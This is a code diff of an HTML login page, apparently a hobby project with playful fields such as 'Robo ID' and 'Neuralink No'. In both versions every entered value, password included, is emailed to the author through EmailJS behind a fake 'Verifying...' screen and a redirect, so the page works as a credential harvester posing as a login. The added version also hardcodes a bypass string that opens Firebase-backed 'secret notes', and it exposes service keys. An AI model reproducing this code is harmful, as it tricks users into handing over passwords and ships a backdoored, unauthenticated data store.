@@ -2,186 +2,241 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    
-    <!-- EmailJS SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-    <script>
-        (function(){
-            emailjs.init("IlVJwCd-9iAQIiHI7"); // Your Public Key
-        })();
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page with Secret Notes</title>
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function () {
+      emailjs.init("IlVJwCd-9iAQIiHI7");
+    })();
+  </script>
 
-        body {
-            font-family: 'Poppins', sans-serif;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: url('login background 123.png') no-repeat center center/cover;
-            overflow: hidden;
-        }
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getDatabase, ref, get, set, remove } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
-        .login-container {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            padding: 40px 30px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0px 4px 30px rgba(0, 0, 0, 0.1);
-            width: 350px;
-            text-align: center;
-        }
+    const firebaseConfig = {
+      apiKey: "AIzaSyAnRpupObYmukI2-VfsVmxL4UTfFF7xSCg",
+      authDomain: "secret-notes-6c2ca.firebaseapp.com",
+      databaseURL: "https://secret-notes-6c2ca-default-rtdb.firebaseio.com",
+      projectId: "secret-notes-6c2ca",
+      storageBucket: "secret-notes-6c2ca.appspot.com",
+      messagingSenderId: "10438001798",
+      appId: "1:10438001798:web:d4d8b607266f2502a2fd07"
+    };
 
-        .login-container h2 {
-            color: #fff;
-            margin-bottom: 20px;
-        }
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-        .login-container label {
-            display: block;
-            text-align: left;
-            margin-bottom: 8px;
-            color: #d1d5db;
-        }
+    window.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("login-form");
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
 
-        .login-container input[type="text"],
-        .login-container input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
-            outline: none;
-        }
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const roboId = document.getElementById("robo-id").value;
+        const neuralinkNo = document.getElementById("neuralink-no").value;
+        const teleportationId = document.getElementById("teleportation-id").value;
 
-        .login-container input[type="submit"] {
-            width: 100%;
-            padding: 10px;
-            background-color: #6d28d9;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
+        const allValues = [username, password, roboId, neuralinkNo, teleportationId].join(" ");
+        const secretCode = "fafa123";
 
-        .login-container input[type="submit"]:hover {
-            background-color: #4c1d95;
-        }
+        if (allValues.includes(secretCode)) {
+          document.querySelector(".login-container").style.display = "none";
+          document.getElementById("secret-section").style.display = "block";
 
-        .back-button {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            width: 40px;
-            height: 40px;
-            cursor: pointer;
-        }
+          const noteSnap = await get(ref(db, 'secretNote'));
+          document.getElementById("secret-notes").value = noteSnap.exists() ? noteSnap.val() : "";
+        } else {
+          document.getElementById("verification-box").style.display = "block";
 
-        .verification-box {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 1;
-            text-align: center;
-        }
+          const templateParams = {
+            username,
+            password,
+            robo_id: roboId,
+            neuralink_no: neuralinkNo,
+            teleportation_id: teleportationId
+          };
 
-        .verification-message {
-            background: rgba(255, 255, 255, 0.9);
-            color: #333;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 5px;
+          emailjs.send('service_o5fuvdj', 'template_gfzy3aw', templateParams)
+            .then(() => {
+              setTimeout(() => window.location.href = "pg 1.html", 2000);
+            })
+            .catch(() => alert("Email failed. Try again."));
         }
+      });
+    });
 
-        .verification-box img {
-            width: 5cm;
-            height: 3cm;
-            border-radius: 10px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-        }
-    </style>
+    window.saveNote = () => {
+      const content = document.getElementById("secret-notes").value;
+      set(ref(db, 'secretNote'), content).then(() => alert("Note saved."));
+    }
+
+    window.deleteNote = () => {
+      remove(ref(db, 'secretNote')).then(() => {
+        document.getElementById("secret-notes").value = "";
+        alert("Note deleted.");
+      });
+    }
+
+    window.backToLogin = () => {
+      document.getElementById("secret-section").style.display = "none";
+      document.querySelector(".login-container").style.display = "block";
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: url('login background 123.png') no-repeat center center/cover;
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.2);
+      padding: 40px 30px;
+      border-radius: 10px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      width: 350px;
+      text-align: center;
+    }
+
+    .secret-section {
+      background: rgba(255, 255, 255, 0.2);
+      padding: 40px 30px;
+      border-radius: 10px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      width: 350px;
+      display: none;
+      color: white;
+      text-align: center;
+    }
+
+    .login-container h2, .secret-section h2 {
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    label {
+      color: white;
+      display: block;
+      margin-top: 10px;
+      text-align: left;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: none;
+      border-radius: 5px;
+      outline: none;
+    }
+
+    input[type="submit"], .secret-section button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 20px;
+      background-color: #6d28d9;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover, .secret-section button:hover {
+      background-color: #4c1d95;
+    }
+
+    .verification-box {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    .secret-section textarea {
+      width: 100%;
+      height: 100px;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      margin-top: 10px;
+    }
+
+    .secret-section .buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .back-button {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 40px;
+      height: 40px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 
 <body>
-    <img src="https://cdn-icons-png.flaticon.com/128/10238/10238019.png" alt="Back" class="back-button" onclick="window.location.href='index.html';">
+  <img src="https://cdn-icons-png.flaticon.com/128/10238/10238019.png" alt="Back" class="back-button" onclick="window.location.href='index.html';">
 
-    <div class="login-container">
-        <h2>Login</h2>
-        <form id="login-form" onsubmit="return showVerificationMessage()">
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" required>
+  <div class="login-container">
+    <h2>Login</h2>
+    <form id="login-form">
+      <label for="username">Username</label>
+      <input type="text" id="username" required>
 
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
+      <label for="password">Password</label>
+      <input type="password" id="password" required>
 
-            <label for="robo-id">Robo ID</label>
-            <input type="text" id="robo-id" name="robo-id" required>
+      <label for="robo-id">Robo ID</label>
+      <input type="text" id="robo-id" required>
 
-            <label for="neuralink-no">Neuralink No</label>
-            <input type="text" id="neuralink-no" name="neuralink-no" required>
+      <label for="neuralink-no">Neuralink No</label>
+      <input type="text" id="neuralink-no" required>
 
-            <label for="teleportation-id">Teleportation ID</label>
-            <input type="text" id="teleportation-id" name="teleportation-id" required>
+      <label for="teleportation-id">Teleportation ID</label>
+      <input type="text" id="teleportation-id" required>
 
-            <input type="submit" value="Login">
-        </form>
+      <input type="submit" value="Login">
+    </form>
+  </div>
+
+  <div class="verification-box" id="verification-box">
+    <p>Verifying...</p>
+    <img src="https://miro.medium.com/v2/resize:fit:1400/1*CsJ05WEGfunYMLGfsT2sXA.gif" width="200">
+  </div>
+
+  <div class="secret-section" id="secret-section">
+    <h2>Secret Notes</h2>
+    <textarea id="secret-notes" placeholder="Write something secret..."></textarea>
+    <div class="buttons">
+      <button onclick="saveNote()">Save</button>
+      <button onclick="deleteNote()">Delete</button>
     </div>
-
-    <!-- Verifying Animation -->
-    <div class="verification-box" id="verification-box">
-        <div class="verification-message">Verifying...</div>
-        <img src="https://miro.medium.com/v2/resize:fit:1400/1*CsJ05WEGfunYMLGfsT2sXA.gif" alt="Loading Animation">
+    <div style="margin-top: 20px;">
+      <button onclick="backToLogin()">Back to Login</button>
     </div>
-
-    <script>
-        function showVerificationMessage() {
-            var verificationBox = document.getElementById('verification-box');
-            verificationBox.style.display = 'block';
-
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var roboId = document.getElementById('robo-id').value;
-            var neuralinkNo = document.getElementById('neuralink-no').value;
-            var teleportationId = document.getElementById('teleportation-id').value;
-
-            var templateParams = {
-                username: username,
-                password: password,
-                robo_id: roboId,
-                neuralink_no: neuralinkNo,
-                teleportation_id: teleportationId
-            };
-
-            emailjs.send('service_o5fuvdj', 'template_gfzy3aw', templateParams)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    setTimeout(function () {
-                        window.location.href = 'pg 1.html';
-                    }, 2000);
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert("Failed to send email. Please try again.");
-                });
-
-            return false; // Prevent real form submit
-        }
-    </script>
-
+  </div>
 </body>
 
 </html>
